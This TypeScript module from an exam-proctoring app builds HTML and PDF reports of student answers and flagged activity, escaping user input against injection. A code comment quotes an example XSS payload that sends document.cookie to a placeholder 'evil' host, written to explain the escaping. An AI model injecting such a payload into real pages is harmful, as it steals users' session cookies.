import {
  getOtisakExamById,
  getUserAttempts,
  getAttemptResults,
} from '../db/otisak';
import { findUserById } from '../db/users';
import { getActivityLog, getActivityStats, enrichActivityEventData } from '../db/activity-log';

type Awaitable<T> = T | Promise<T>;
type StudentReportPayload = {
  html: string;
  // Filesystem-safe base for the PDF filename (no extension).
  filenameBase: string;
  studentLabel: string;
  totalPoints: number;
  maxPoints: number;
  percentage: number;
  passed: boolean;
  timeSpentSeconds: number;
};

export type StudentReportResult =
  | { ok: true; data: StudentReportPayload }
  | { ok: false; error: string; status: number };

// User/admin-controlled strings going into this HTML must be escaped: exam title,
// question text, answer text, student.name/email, text_answer (free-text student
// input), subject_name. Otherwise a student types
//   <script>fetch('//evil/'+document.cookie)</script>
// and the PDF rendering page happily executes it.
function escapeHtml(s: unknown): string {
  if (s === null || s === undefined) return '';
  return String(s).replace(/[&<>"']/g, (c) => (
    { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' } as Record<string, string>
  )[c]);
}

function formatTime(date: Date | string): string {
  return new Date(date).toLocaleTimeString('sr-RS', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
}
function formatDate(date: Date | string): string {
  return new Date(date).toLocaleDateString('sr-RS', { day: '2-digit', month: '2-digit', year: 'numeric' });
}
function formatDuration(seconds: number): string {
  const m = Math.floor(seconds / 60);
  const s = seconds % 60;
  return `${m}m ${s}s`;
}

const EVENT_LABELS: Record<string, string> = {
  exam_view_started: 'Pocetak pregleda ispita',
  exam_submit: 'Predaja ispita',
  answer_selected: 'Odgovor izabran',
  answer_deselected: 'Odgovor ponisten',
  question_next: 'Sledece pitanje',
  question_prev: 'Prethodno pitanje',
  keystroke_batch: 'Unos tastaturom',
  key_combo: 'Kombinacija tastera',
  special_key: 'Specijalan taster',
  copy_attempt: 'Pokusaj kopiranja',
  cut_attempt: 'Pokusaj isecanja',
  paste_attempt: 'Pokusaj lepljenja',
  right_click: 'Desni klik',
  page_blur: 'Napustanje prozora',
  page_focus: 'Povratak u prozor',
  visibility_change: 'Promena vidljivosti',
  tab_switch: 'Promena taba',
  window_resize: 'Promena velicine prozora',
  mouse_leave_window: 'Mis napustio prozor',
  print_attempt: 'Pokusaj stampanja',
  devtools_attempt: 'Pokusaj otvaranja DevTools',
  text_typed: 'Unos teksta',
};

const SUSPICIOUS_TYPES = new Set([
  'copy_attempt', 'cut_attempt', 'paste_attempt', 'page_blur',
  'mouse_leave_window', 'devtools_attempt', 'print_attempt', 'tab_switch',
]);

// Single source of truth for the student-report HTML. Used both by the single-student
// /report/:userId/pdf endpoint and by the bulk /export-results ZIP route - they would
// otherwise drift apart with every styling tweak.
export async function buildStudentReportHTML(examId: string, userId: string): Promise<StudentReportResult> {
  const exam = await getOtisakExamById(examId);
  if (!exam) return { ok: false, error: 'Exam not found', status: 404 };

  const student = await findUserById(userId);
  if (!student) return { ok: false, error: 'Student not found', status: 404 };

  const attempts = await getUserAttempts(userId);
  const attempt = attempts.find((a) => a.exam_id === examId && a.submitted);
  if (!attempt) return { ok: false, error: 'No submitted attempt', status: 404 };

  const results = await getAttemptResults(attempt.id);
  const activityLog = await getActivityLog(attempt.id);
  const stats = await getActivityStats(attempt.id);

  const totalPoints = Number(attempt.total_points);
  const maxPoints = Number(attempt.max_points);
  const percentage = maxPoints > 0 ? Math.round((totalPoints / maxPoints) * 100) : 0;
  const hasPassThreshold = (exam as { has_pass_threshold?: boolean }).has_pass_threshold !== false;
  const passed = hasPassThreshold && percentage >= Number(exam.pass_threshold);

  const suspiciousEvents = activityLog.filter((e) => SUSPICIOUS_TYPES.has(e.event_type));

  const questionsHtml = results?.questions.map((q, idx) => {
    const correct = q.points_awarded > 0;
    const answersHtml = q.answers.map((a) => {
      const selected = q.selected_answer_ids.includes(a.id);
      const isCorrect = q.correct_answer_ids.includes(a.id);
      const bg = isCorrect ? '#052e16' : selected ? '#450a0a' : '#111827';
      const border = isCorrect ? '#059669' : selected && !isCorrect ? '#dc2626' : '#1f2937';
      const icon = isCorrect ? '&#10003;' : selected && !isCorrect ? '&#10007;' : '&nbsp;&nbsp;';
      return `<div style="padding:6px 10px;margin:3px 0;border-radius:6px;background:${bg};border:1px solid ${border};font-size:11px;color:#e5e7eb;display:flex;align-items:center;gap:8px;">
        <span style="font-weight:bold;color:${isCorrect ? '#34d399' : selected ? '#f87171' : '#6b7280'};font-size:13px;">${icon}</span>
        ${escapeHtml(a.text)}
        ${selected && !isCorrect ? '<span style="margin-left:auto;color:#f87171;font-size:9px;">VAS ODGOVOR</span>' : ''}
        ${isCorrect && !selected ? '<span style="margin-left:auto;color:#34d399;font-size:9px;">TACAN</span>' : ''}
      </div>`;
    }).join('');

    return `<div style="margin-bottom:16px;padding:14px;border-radius:10px;border:1px solid ${correct ? '#065f46' : '#7f1d1d'};background:${correct ? 'rgba(5,46,22,0.3)' : 'rgba(69,10,10,0.3)'};">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
        <span style="font-size:10px;text-transform:uppercase;letter-spacing:2px;color:${correct ? '#34d399' : '#f87171'};">Pitanje ${idx + 1} ${correct ? '&#10003;' : '&#10007;'}</span>
        <span style="font-size:11px;font-weight:bold;color:${correct ? '#34d399' : '#f87171'};">${Number(q.points_awarded)}/${Number(q.question.points)} bod.</span>
      </div>
      <p style="font-size:12px;color:#f1f5f9;margin-bottom:10px;line-height:1.5;">${escapeHtml(q.question.text)}</p>
      ${q.question.type === 'open_text' ? `<div style="padding:8px 10px;border-radius:6px;background:#111827;border:1px solid #1f2937;font-size:11px;color:#94a3b8;"><strong>Odgovor:</strong> ${q.text_answer ? escapeHtml(q.text_answer) : '<em>Bez odgovora</em>'}</div>` : answersHtml}
    </div>`;
  }).join('') || '';

  const enrichedActivity = await enrichActivityEventData(examId, activityLog);
  const timelineHtml = enrichedActivity.slice(0, 200).map((e) => {
    const isSuspicious = SUSPICIOUS_TYPES.has(e.event_type);
    const color = isSuspicious ? '#f87171' : '#94a3b8';
    const bg = isSuspicious ? 'rgba(239,68,68,0.05)' : 'transparent';
    const label = EVENT_LABELS[e.event_type] || e.event_type;
    const dataStr = Object.entries(e.event_data || {}).map(([k, v]) => `${k}: ${escapeHtml(String(v))}`).join('<br/>');
    return `<tr style="background:${bg};">
      <td style="padding:5px 8px;font-size:10px;color:#6b7280;font-family:monospace;white-space:nowrap;border-bottom:1px solid #1a1a2e;vertical-align:top;">${formatTime(e.timestamp)}</td>
      <td style="padding:5px 8px;font-size:10px;color:${color};border-bottom:1px solid #1a1a2e;vertical-align:top;white-space:nowrap;">${isSuspicious ? '&#9888; ' : ''}${label}</td>
      <td style="padding:5px 8px;font-size:10px;color:#cbd5e1;border-bottom:1px solid #1a1a2e;line-height:1.5;">${dataStr}</td>
    </tr>`;
  }).join('');

  const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>OTISAK Izvestaj - ${escapeHtml(student.name || student.email)}</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');
  @page { size: A4; margin: 0; }
  * { margin:0; padding:0; box-sizing:border-box; }
  html, body { background:#070b14; color:#e5e7eb; font-family:'Inter',sans-serif; -webkit-print-color-adjust:exact !important; print-color-adjust:exact !important; }
  .page { background:#070b14; padding:14mm 12mm; }
  @media print {
    .no-print { display:none !important; }
  }
</style>
</head>
<body>
<div class="page">
  <div style="display:flex;align-items:center;justify-content:space-between;padding-bottom:20px;border-bottom:2px solid #2563eb;margin-bottom:30px;">
    <div>
      <div style="font-size:28px;font-weight:300;color:#3b82f6;letter-spacing:6px;">OTISAK</div>
      <div style="font-size:9px;color:#6b7280;letter-spacing:3px;text-transform:uppercase;margin-top:2px;">Detaljan izvestaj o aktivnosti studenta</div>
    </div>
    <div style="text-align:right;">
      <div style="font-size:10px;color:#6b7280;">Generisano</div>
      <div style="font-size:11px;color:#94a3b8;">${formatDate(new Date())} ${formatTime(new Date())}</div>
    </div>
  </div>

  <div style="display:flex;gap:16px;margin-bottom:24px;">
    <div style="flex:1;padding:16px;border-radius:10px;background:#0d1117;border:1px solid #1e3a5f;">
      <div style="font-size:9px;text-transform:uppercase;letter-spacing:2px;color:#3b82f6;margin-bottom:8px;">Student</div>
      <div style="font-size:16px;font-weight:600;color:#f1f5f9;">${escapeHtml(student.name) || 'N/A'}</div>
      <div style="font-size:11px;color:#60a5fa;font-family:'JetBrains Mono',monospace;margin-top:2px;">${escapeHtml(student.index_number || '')}</div>
      <div style="font-size:10px;color:#6b7280;margin-top:4px;">${escapeHtml(student.email)}</div>
    </div>
    <div style="flex:1;padding:16px;border-radius:10px;background:#0d1117;border:1px solid #1e3a5f;">
      <div style="font-size:9px;text-transform:uppercase;letter-spacing:2px;color:#3b82f6;margin-bottom:8px;">Ispit</div>
      <div style="font-size:16px;font-weight:600;color:#f1f5f9;">${escapeHtml(exam.title)}</div>
      <div style="font-size:11px;color:#94a3b8;margin-top:2px;">${escapeHtml(exam.subject_name || '')}</div>
      <div style="font-size:10px;color:#6b7280;margin-top:4px;">${formatDate(attempt.started_at)} | Trajanje: ${formatDuration(Number(attempt.time_spent_seconds))}</div>
    </div>
  </div>

  ${hasPassThreshold
    ? `<div style="padding:20px;border-radius:12px;background:${passed ? 'rgba(5,46,22,0.4)' : 'rgba(69,10,10,0.4)'};border:2px solid ${passed ? '#059669' : '#dc2626'};margin-bottom:24px;text-align:center;">
        <div style="font-size:48px;font-weight:700;color:${passed ? '#34d399' : '#f87171'};font-family:'JetBrains Mono',monospace;">${totalPoints}/${maxPoints}</div>
        <div style="font-size:14px;color:${passed ? '#34d399' : '#f87171'};margin-top:4px;">${percentage}% | ${passed ? 'POLOZENO' : 'NIJE POLOZENO'}</div>
        <div style="font-size:10px;color:#6b7280;margin-top:4px;">Prag: ${exam.pass_threshold}% | Vreme: ${formatDuration(Number(attempt.time_spent_seconds))}</div>
      </div>`
    : `<div style="padding:20px;border-radius:12px;background:rgba(30,58,138,0.3);border:2px solid #3b82f6;margin-bottom:24px;text-align:center;">
        <div style="font-size:48px;font-weight:700;color:#60a5fa;font-family:'JetBrains Mono',monospace;">${totalPoints}/${maxPoints}</div>
        <div style="font-size:14px;color:#60a5fa;margin-top:4px;">${percentage}%</div>
        <div style="font-size:10px;color:#6b7280;margin-top:4px;">Vreme: ${formatDuration(Number(attempt.time_spent_seconds))}</div>
      </div>`
  }

  <div style="margin-bottom:24px;">
    <div style="font-size:11px;text-transform:uppercase;letter-spacing:3px;color:#3b82f6;margin-bottom:12px;font-weight:600;">Statistika aktivnosti</div>
    <div style="display:flex;gap:10px;flex-wrap:wrap;">
      ${[
        { label: 'Ukupno dogadjaja', value: stats.totalEvents, color: '#3b82f6' },
        { label: 'Unosi tastature', value: stats.keystrokes, color: '#3b82f6' },
        { label: 'Promena odgovora', value: stats.answerChanges, color: '#f59e0b' },
        { label: 'Napustanje prozora', value: stats.tabSwitches, color: stats.tabSwitches > 3 ? '#ef4444' : '#f59e0b' },
        { label: 'Pokusaji kopiranja', value: stats.copyAttempts, color: stats.copyAttempts > 0 ? '#ef4444' : '#22c55e' },
        { label: 'Desni klikovi', value: stats.rightClicks, color: stats.rightClicks > 2 ? '#ef4444' : '#6b7280' },
      ].map((s) => `<div style="flex:1;min-width:120px;padding:12px;border-radius:8px;background:#0d1117;border:1px solid #1f2937;text-align:center;">
        <div style="font-size:22px;font-weight:700;color:${s.color};font-family:'JetBrains Mono',monospace;">${s.value}</div>
        <div style="font-size:9px;color:#6b7280;text-transform:uppercase;letter-spacing:1px;margin-top:4px;">${s.label}</div>
      </div>`).join('')}
    </div>
  </div>

  ${suspiciousEvents.length > 0 ? `
  <div style="margin-bottom:24px;padding:16px;border-radius:10px;background:rgba(239,68,68,0.05);border:1px solid rgba(239,68,68,0.2);">
    <div style="font-size:11px;text-transform:uppercase;letter-spacing:3px;color:#ef4444;margin-bottom:10px;font-weight:600;">&#9888; Sumnjiva aktivnost (${suspiciousEvents.length})</div>
    <table style="width:100%;border-collapse:collapse;">
      ${suspiciousEvents.map((e) => `<tr>
        <td style="padding:3px 6px;font-size:10px;color:#6b7280;font-family:monospace;">${formatTime(e.timestamp)}</td>
        <td style="padding:3px 6px;font-size:10px;color:#f87171;">${EVENT_LABELS[e.event_type] || e.event_type}</td>
      </tr>`).join('')}
    </table>
  </div>
  ` : `
  <div style="margin-bottom:24px;padding:14px;border-radius:10px;background:rgba(34,197,94,0.05);border:1px solid rgba(34,197,94,0.2);">
    <div style="font-size:11px;color:#22c55e;">&#10003; Nije detektovana sumnjiva aktivnost</div>
  </div>
  `}

  <div style="margin-bottom:24px;">
    <div style="font-size:11px;text-transform:uppercase;letter-spacing:3px;color:#3b82f6;margin-bottom:12px;font-weight:600;">Odgovori po pitanjima</div>
    ${questionsHtml}
  </div>

  <div style="margin-bottom:24px;">
    <div style="font-size:11px;text-transform:uppercase;letter-spacing:3px;color:#3b82f6;margin-bottom:12px;font-weight:600;">Hronologija aktivnosti (${activityLog.length} dogadjaja)</div>
    <div style="border-radius:10px;background:#0d1117;border:1px solid #1f2937;overflow:hidden;">
      <table style="width:100%;border-collapse:collapse;">
        <thead>
          <tr style="background:#111827;">
            <th style="padding:6px 8px;text-align:left;font-size:9px;color:#6b7280;text-transform:uppercase;letter-spacing:1px;border-bottom:1px solid #1f2937;">Vreme</th>
            <th style="padding:6px 8px;text-align:left;font-size:9px;color:#6b7280;text-transform:uppercase;letter-spacing:1px;border-bottom:1px solid #1f2937;">Dogadjaj</th>
            <th style="padding:6px 8px;text-align:left;font-size:9px;color:#6b7280;text-transform:uppercase;letter-spacing:1px;border-bottom:1px solid #1f2937;">Detalji</th>
          </tr>
        </thead>
        <tbody>${timelineHtml}</tbody>
      </table>
      ${activityLog.length > 200 ? `<div style="padding:8px;text-align:center;font-size:10px;color:#6b7280;">... i jos ${activityLog.length - 200} dogadjaja</div>` : ''}
    </div>
  </div>

  <div style="border-top:1px solid #1f2937;padding-top:16px;text-align:center;">
    <div style="font-size:10px;color:#4b5563;">OTISAK v2.0 | Izvestaj generisan automatski</div>
    <div style="font-size:9px;color:#374151;margin-top:4px;">Ovaj dokument je poverljiv i namenjen iskljucivo ovlascenom osoblju.</div>
  </div>
</div>
</body>
</html>`;

  const safeName = (student.index_number || student.name || student.email).replace(/[^a-z0-9._-]+/gi, '_');

  return {
    ok: true,
    data: {
      html,
      filenameBase: `otisak-izvestaj-${safeName}`,
      studentLabel: student.name || student.email,
      totalPoints,
      maxPoints,
      percentage,
      passed,
      timeSpentSeconds: Number(attempt.time_spent_seconds),
    },
  };
}

// Build the HTML for the *summary* (results table) PDF. The CSV is a sibling artifact
// - this is the formatted-table version that prints nicely as a one-shot overview.
export function buildResultsTableHTML(args: {
  examTitle: string;
  subjectName: string | null;
  passThreshold: number;
  hasPassThreshold?: boolean;
  rows: Array<{
    name: string | null;
    indexNumber: string | null;
    email: string;
    totalPoints: number;
    maxPoints: number;
    percentage: number;
    passed: boolean;
    timeSpentSeconds: number;
    suspiciousCount: number;
  }>;
}): string {
  const { examTitle, subjectName, passThreshold, hasPassThreshold = true, rows } = args;

  const passedCount = hasPassThreshold ? rows.filter((r) => r.passed).length : 0;
  const avgPct = rows.length ? Math.round(rows.reduce((s, r) => s + r.percentage, 0) / rows.length) : 0;

  const rowsHtml = rows
    .slice()
    .sort((a, b) => b.totalPoints - a.totalPoints)
    .map((r, i) => {
      const stripe = i % 2 === 0 ? '#0d1117' : '#111827';
      // When threshold is disabled, drop the verdict colouring and the Status
      // column. The score becomes a neutral blue so admins don't read green as
      // "passed" when there's no threshold to be passed.
      const scoreColor = hasPassThreshold ? (r.passed ? '#34d399' : '#f87171') : '#60a5fa';
      return `<tr style="background:${stripe};">
        <td style="padding:8px 10px;font-size:11px;color:#cbd5e1;border-bottom:1px solid #1f2937;font-family:'JetBrains Mono',monospace;">${i + 1}</td>
        <td style="padding:8px 10px;font-size:11px;color:#f1f5f9;border-bottom:1px solid #1f2937;">${escapeHtml(r.name || '-')}</td>
        <td style="padding:8px 10px;font-size:11px;color:#60a5fa;border-bottom:1px solid #1f2937;font-family:'JetBrains Mono',monospace;">${escapeHtml(r.indexNumber || '-')}</td>
        <td style="padding:8px 10px;font-size:11px;color:#94a3b8;border-bottom:1px solid #1f2937;">${escapeHtml(r.email)}</td>
        <td style="padding:8px 10px;font-size:11px;color:${scoreColor};border-bottom:1px solid #1f2937;font-family:'JetBrains Mono',monospace;text-align:right;font-weight:600;">${r.totalPoints}/${r.maxPoints}</td>
        <td style="padding:8px 10px;font-size:11px;color:${scoreColor};border-bottom:1px solid #1f2937;font-family:'JetBrains Mono',monospace;text-align:right;">${r.percentage}%</td>
        ${hasPassThreshold ? `<td style="padding:8px 10px;font-size:10px;color:${scoreColor};border-bottom:1px solid #1f2937;text-transform:uppercase;letter-spacing:1px;">${r.passed ? 'POLOZENO' : 'NIJE'}</td>` : ''}
        <td style="padding:8px 10px;font-size:11px;color:#94a3b8;border-bottom:1px solid #1f2937;font-family:'JetBrains Mono',monospace;text-align:right;">${formatDuration(r.timeSpentSeconds)}</td>
        <td style="padding:8px 10px;font-size:11px;color:${r.suspiciousCount > 0 ? '#ef4444' : '#6b7280'};border-bottom:1px solid #1f2937;text-align:right;font-weight:${r.suspiciousCount > 0 ? '700' : '400'};">${r.suspiciousCount}</td>
      </tr>`;
    })
    .join('');

  return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>OTISAK Rezultati - ${escapeHtml(examTitle)}</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');
  @page { size: A4 landscape; margin: 0; }
  * { margin:0; padding:0; box-sizing:border-box; }
  html, body { background:#070b14; color:#e5e7eb; font-family:'Inter',sans-serif; -webkit-print-color-adjust:exact !important; print-color-adjust:exact !important; }
  .page { background:#070b14; padding:12mm 12mm; }
</style>
</head>
<body>
<div class="page">
  <div style="display:flex;align-items:center;justify-content:space-between;padding-bottom:16px;border-bottom:2px solid #2563eb;margin-bottom:20px;">
    <div>
      <div style="font-size:24px;font-weight:300;color:#3b82f6;letter-spacing:6px;">OTISAK</div>
      <div style="font-size:9px;color:#6b7280;letter-spacing:3px;text-transform:uppercase;margin-top:2px;">Tabela rezultata ispita</div>
    </div>
    <div style="text-align:right;">
      <div style="font-size:10px;color:#6b7280;">Generisano</div>
      <div style="font-size:11px;color:#94a3b8;">${formatDate(new Date())} ${formatTime(new Date())}</div>
    </div>
  </div>

  <div style="display:flex;gap:16px;margin-bottom:20px;">
    <div style="flex:1;padding:14px 16px;border-radius:10px;background:#0d1117;border:1px solid #1e3a5f;">
      <div style="font-size:9px;text-transform:uppercase;letter-spacing:2px;color:#3b82f6;margin-bottom:6px;">Ispit</div>
      <div style="font-size:15px;font-weight:600;color:#f1f5f9;">${escapeHtml(examTitle)}</div>
      ${subjectName ? `<div style="font-size:11px;color:#94a3b8;margin-top:2px;">${escapeHtml(subjectName)}</div>` : ''}
    </div>
    <div style="padding:14px 16px;border-radius:10px;background:#0d1117;border:1px solid #1e3a5f;text-align:center;">
      <div style="font-size:22px;font-weight:700;color:#3b82f6;font-family:'JetBrains Mono',monospace;">${rows.length}</div>
      <div style="font-size:9px;color:#6b7280;text-transform:uppercase;letter-spacing:1px;margin-top:2px;">Studenata</div>
    </div>
    ${hasPassThreshold ? `<div style="padding:14px 16px;border-radius:10px;background:#0d1117;border:1px solid #1e3a5f;text-align:center;">
      <div style="font-size:22px;font-weight:700;color:#34d399;font-family:'JetBrains Mono',monospace;">${passedCount}</div>
      <div style="font-size:9px;color:#6b7280;text-transform:uppercase;letter-spacing:1px;margin-top:2px;">Polozeno (prag ${passThreshold}%)</div>
    </div>` : ''}
    <div style="padding:14px 16px;border-radius:10px;background:#0d1117;border:1px solid #1e3a5f;text-align:center;">
      <div style="font-size:22px;font-weight:700;color:#f59e0b;font-family:'JetBrains Mono',monospace;">${avgPct}%</div>
      <div style="font-size:9px;color:#6b7280;text-transform:uppercase;letter-spacing:1px;margin-top:2px;">Prosek</div>
    </div>
  </div>

  <table style="width:100%;border-collapse:collapse;border-radius:10px;overflow:hidden;border:1px solid #1f2937;">
    <thead>
      <tr style="background:#1a2340;">
        <th style="padding:8px 10px;text-align:left;font-size:9px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;">#</th>
        <th style="padding:8px 10px;text-align:left;font-size:9px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;">Ime</th>
        <th style="padding:8px 10px;text-align:left;font-size:9px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;">Indeks</th>
        <th style="padding:8px 10px;text-align:left;font-size:9px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;">Email</th>
        <th style="padding:8px 10px;text-align:right;font-size:9px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;">Bodovi</th>
        <th style="padding:8px 10px;text-align:right;font-size:9px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;">%</th>
        ${hasPassThreshold ? `<th style="padding:8px 10px;text-align:left;font-size:9px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;">Status</th>` : ''}
        <th style="padding:8px 10px;text-align:right;font-size:9px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;">Vreme</th>
        <th style="padding:8px 10px;text-align:right;font-size:9px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;">Sumnjivo</th>
      </tr>
    </thead>
    <tbody>${rowsHtml}</tbody>
  </table>

  <div style="border-top:1px solid #1f2937;margin-top:16px;padding-top:10px;text-align:center;">
    <div style="font-size:9px;color:#4b5563;">OTISAK v2.0 | Tabela generisana automatski</div>
  </div>
</div>
</body>
</html>`;
}

// Convenience: render an HTML page to a PDF buffer using a (possibly shared) Puppeteer
// browser. Caller is responsible for closing the browser.
//
// Timeouts: setContent with `networkidle0` can hang if a remote asset (Google
// Fonts CDN, in particular) is slow or blocked. Without explicit timeouts the
// request handler that called us would wait indefinitely, holding a DB
// connection and a chromium page until the client gives up. We cap each phase
// so the worst case is "PDF fails for this student" rather than "the server is
// stuck for that exam's exporters".
const PUPPETEER_NAVIGATION_TIMEOUT_MS = 15_000;
const PUPPETEER_PDF_TIMEOUT_MS = 30_000;

export async function renderHtmlToPdf(html: string, browserPromise: Awaitable<import('puppeteer').Browser>, landscape = false): Promise<Buffer> {
  const browser = await browserPromise;
  const page = await browser.newPage();
  // domcontentloaded is significantly more reliable than networkidle0 - fonts
  // load from a CDN over the open internet and the previous `networkidle0`
  // waited for *every* outbound request to settle. domcontentloaded fires when
  // the inline HTML/CSS is parsed, which is enough for our report (no JS
  // hydration, all styles inline).
  page.setDefaultNavigationTimeout(PUPPETEER_NAVIGATION_TIMEOUT_MS);
  page.setDefaultTimeout(PUPPETEER_NAVIGATION_TIMEOUT_MS);
  try {
    await page.emulateMediaType('screen');
    await page.setContent(html, { waitUntil: 'domcontentloaded', timeout: PUPPETEER_NAVIGATION_TIMEOUT_MS });
    const pdf = await page.pdf({
      format: 'A4',
      landscape,
      printBackground: true,
      preferCSSPageSize: true,
      margin: { top: 0, bottom: 0, left: 0, right: 0 },
      timeout: PUPPETEER_PDF_TIMEOUT_MS,
    });
    return Buffer.from(pdf);
  } finally {
    // Always close the page - even if setContent / pdf throws, leaking pages
    // would pile up inside the long-lived browser singleton.
    await page.close().catch((err) => console.error('renderHtmlToPdf: page.close failed', err));
  }
}
